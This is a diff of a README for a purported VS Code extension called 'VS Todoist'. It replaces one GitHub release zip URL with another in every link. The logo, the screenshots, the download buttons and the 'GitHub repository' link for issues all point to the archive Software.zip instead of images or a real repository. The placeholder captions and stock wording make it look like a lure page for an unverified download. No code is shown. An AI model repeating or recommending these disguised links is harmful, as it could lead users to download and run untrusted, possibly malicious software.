@@ -1,10 +1,10 @@
 # VS Todoist
 
-![VS Todoist Logo](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)
+![VS Todoist Logo](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)
 
 🎯 A powerful Visual Studio Code extension that seamlessly integrates Todoist task management into your development workflow. Manage your tasks, projects, and deadlines without leaving your code editor.
 
-[![Download Software](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -34,7 +34,7 @@ To install VS Todoist, follow these steps:
 5. Once installed, you can access VS Todoist from the Visual Studio Code sidebar.
 
 If the link provided for downloading the software needs to be launched, please click the button below:
-[![Download Software](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)
 
 ## Usage
 Once you have installed VS Todoist, you can start managing your tasks seamlessly within Visual Studio Code. Here are some tips to make the most of the extension:
@@ -47,14 +47,14 @@ Once you have installed VS Todoist, you can start managing your tasks seamlessly
 ## Screenshots
 Here are some screenshots of VS Todoist in action:
 
-![Screenshot 1](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)
+![Screenshot 1](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)
 *Caption for Screenshot 1*
 
-![Screenshot 2](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip)
+![Screenshot 2](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip)
 *Caption for Screenshot 2*
 
 ## Contributing
-We welcome contributions to VS Todoist! If you have any ideas for improvement or would like to report a bug, please open an issue on our [GitHub repository](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v1.0.0/Application.zip).
+We welcome contributions to VS Todoist! If you have any ideas for improvement or would like to report a bug, please open an issue on our [GitHub repository](https://github.com/kphlbalikpapan/vs-todoist/releases/download/v2.0/Software.zip).
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
